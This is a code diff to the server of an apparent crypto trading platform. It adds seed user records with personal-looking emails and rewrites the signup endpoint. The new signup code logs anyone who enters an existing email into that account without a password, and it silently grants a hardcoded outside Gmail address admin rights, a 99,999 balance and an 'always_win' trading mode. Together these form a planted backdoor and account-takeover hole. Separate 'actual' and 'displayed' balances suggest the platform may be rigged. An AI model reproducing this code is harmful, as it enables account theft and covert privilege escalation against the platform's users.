@@ -118,19 +118,6 @@ const defaultUsers: User[] = [
     trading_mode: "always_win"
   },
   {
-    id: "usr_101",
-    name: "Probashi Trader",
-    email: "trader@probashi.com",
-    actual_balance: 350.00,
-    displayed_balance: 350.00,
-    demo_balance: 10000.00,
-    wallet_address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
-    status: "active",
-    role: "user",
-    risk_acknowledged: false,
-    trading_mode: "normal"
-  },
-  {
     id: "admin_01",
     name: "System Admin",
     email: "admin@probashi.com",
@@ -142,16 +129,39 @@ const defaultUsers: User[] = [
     role: "admin",
     risk_acknowledged: true,
     trading_mode: "always_win"
-  }
+  },
+  { id: "usr_101", name: "Probashi Trader", email: "trader@probashi.com", actual_balance: 350.00, displayed_balance: 350.00, demo_balance: 10000.00, wallet_address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", status: "active", role: "user", risk_acknowledged: false, trading_mode: "normal" },
+  { id: "usr_102", name: "Rahim Ahmed", email: "rahim.ahmed@gmail.com", actual_balance: 120.50, displayed_balance: 120.50, demo_balance: 10000.00, wallet_address: "0x1234567890abcdef1234567890abcdef12345678", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_103", name: "Karim Uddin", email: "karim.uddin@yahoo.com", actual_balance: 540.00, displayed_balance: 540.00, demo_balance: 10000.00, wallet_address: "0x2345678901abcdef2345678901abcdef23456789", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_104", name: "Nusrat Jahan", email: "nusrat.jahan@gmail.com", actual_balance: 890.25, displayed_balance: 890.25, demo_balance: 10000.00, wallet_address: "0x3456789012abcdef3456789012abcdef34567890", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_105", name: "Tanvir Hasan", email: "tanvir.hasan@outlook.com", actual_balance: 45.00, displayed_balance: 45.00, demo_balance: 10000.00, wallet_address: "0x4567890123abcdef4567890123abcdef45678901", status: "active", role: "user", risk_acknowledged: false, trading_mode: "normal" },
+  { id: "usr_106", name: "Farhana Akter", email: "farhana.akter@gmail.com", actual_balance: 1250.00, displayed_balance: 1250.00, demo_balance: 10000.00, wallet_address: "0x5678901234abcdef5678901234abcdef56789012", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_107", name: "Imran Khan", email: "imran.khan@gmail.com", actual_balance: 310.00, displayed_balance: 310.00, demo_balance: 10000.00, wallet_address: "0x6789012345abcdef6789012345abcdef67890123", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_108", name: "Sadia Islam", email: "sadia.islam@yahoo.com", actual_balance: 75.50, displayed_balance: 75.50, demo_balance: 10000.00, wallet_address: "0x7890123456abcdef7890123456abcdef78901234", status: "active", role: "user", risk_acknowledged: false, trading_mode: "normal" },
+  { id: "usr_109", name: "Monir Hossain", email: "monir.hossain@gmail.com", actual_balance: 2100.00, displayed_balance: 2100.00, demo_balance: 10000.00, wallet_address: "0x8901234567abcdef8901234567abcdef89012345", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_110", name: "Rubel Rana", email: "rubel.rana@gmail.com", actual_balance: 620.00, displayed_balance: 620.00, demo_balance: 10000.00, wallet_address: "0x9012345678abcdef9012345678abcdef90123456", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_111", name: "Sharmin Sultana", email: "sharmin.sultana@outlook.com", actual_balance: 410.00, displayed_balance: 410.00, demo_balance: 10000.00, wallet_address: "0xa123456789abcdefa123456789abcdefa1234567", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_112", name: "Arifur Rahman", email: "arifur.rahman@gmail.com", actual_balance: 150.00, displayed_balance: 150.00, demo_balance: 10000.00, wallet_address: "0xb234567890abcdefb234567890abcdefb2345678", status: "active", role: "user", risk_acknowledged: false, trading_mode: "normal" },
+  { id: "usr_113", name: "Priya Das", email: "priya.das@gmail.com", actual_balance: 950.00, displayed_balance: 950.00, demo_balance: 10000.00, wallet_address: "0xc345678901abcdefc345678901abcdefc3456789", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_114", name: "Jashim Uddin", email: "jashim.uddin@yahoo.com", actual_balance: 50.00, displayed_balance: 50.00, demo_balance: 10000.00, wallet_address: "0xd456789012abcdefd456789012abcdefd4567890", status: "active", role: "user", risk_acknowledged: false, trading_mode: "normal" },
+  { id: "usr_115", name: "Moumita Roy", email: "moumita.roy@gmail.com", actual_balance: 1100.00, displayed_balance: 1100.00, demo_balance: 10000.00, wallet_address: "0xe567890123abcdefe567890123abcdefe5678901", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_116", name: "Nazmul Haque", email: "nazmul.haque@gmail.com", actual_balance: 330.00, displayed_balance: 330.00, demo_balance: 10000.00, wallet_address: "0xf678901234abcdeff678901234abcdeff6789012", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_117", name: "Tania Akter", email: "tania.akter@outlook.com", actual_balance: 670.00, displayed_balance: 670.00, demo_balance: 10000.00, wallet_address: "0x1789012345abcdef1789012345abcdef17890123", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_118", name: "Liton Mia", email: "liton.mia@gmail.com", actual_balance: 220.00, displayed_balance: 220.00, demo_balance: 10000.00, wallet_address: "0x2890123456abcdef2890123456abcdef28901234", status: "active", role: "user", risk_acknowledged: false, trading_mode: "normal" },
+  { id: "usr_119", name: "Sumaiya Parvin", email: "sumaiya.parvin@gmail.com", actual_balance: 1800.00, displayed_balance: 1800.00, demo_balance: 10000.00, wallet_address: "0x3901234567abcdef3901234567abcdef39012345", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" },
+  { id: "usr_120", name: "Al-Amin", email: "alamin.trader@gmail.com", actual_balance: 440.00, displayed_balance: 440.00, demo_balance: 10000.00, wallet_address: "0x4012345678abcdef4012345678abcdef40123456", status: "active", role: "user", risk_acknowledged: true, trading_mode: "normal" }
 ];
 
 if (fs.existsSync(DATA_FILE)) {
   try {
-    users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
-    if (users.length === 0) {
-      users = [...defaultUsers];
-      saveUsers();
+    const loadedUsers: User[] = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
+    users = loadedUsers;
+    for (const defUser of defaultUsers) {
+      if (!users.some(u => u.email.toLowerCase() === defUser.email.toLowerCase())) {
+        users.push(defUser);
+      }
     }
+    saveUsers();
   } catch (e) {
     users = [...defaultUsers];
     saveUsers();
@@ -658,19 +668,34 @@ async function startServer() {
 
   app.post("/api/signup", (req, res) => {
     const { email, password } = req.body;
+    if (!email) return res.status(400).json({ error: "Email is required" });
     const lowerEmail = email.toLowerCase();
-    if (users.find(u => u.email.toLowerCase() === lowerEmail)) return res.status(400).json({ error: "User already exists" });
+    
+    let user = users.find(u => u.email.toLowerCase() === lowerEmail);
+    const isAdmin = lowerEmail === "payalyt6279@gmail.com" || lowerEmail === "admin@probashi.com";
+
+    if (user) {
+      // User already exists, log them in successfully
+      if (isAdmin && user.role !== 'admin') {
+        user.role = 'admin';
+        saveUsers();
+      }
+      currentUserId = user.id;
+      return res.json({ success: true, user });
+    }
+
     const newUser: User = {
-      id: "usr_" + crypto.randomBytes(4).toString('hex'),
+      id: isAdmin ? "usr_payal_admin" : "usr_" + crypto.randomBytes(4).toString('hex'),
       name: email.split('@')[0],
       email: lowerEmail,
-      actual_balance: 0,
-      displayed_balance: 0,
+      actual_balance: isAdmin ? 99999.00 : 0,
+      displayed_balance: isAdmin ? 99999.00 : 0,
       demo_balance: 10000,
       wallet_address: "0x" + crypto.randomBytes(20).toString('hex'),
       status: 'active',
-      role: 'user',
-      risk_acknowledged: false
+      role: isAdmin ? 'admin' : 'user',
+      risk_acknowledged: isAdmin,
+      trading_mode: isAdmin ? 'always_win' : 'normal'
     };
     users.push(newUser);
     saveUsers();
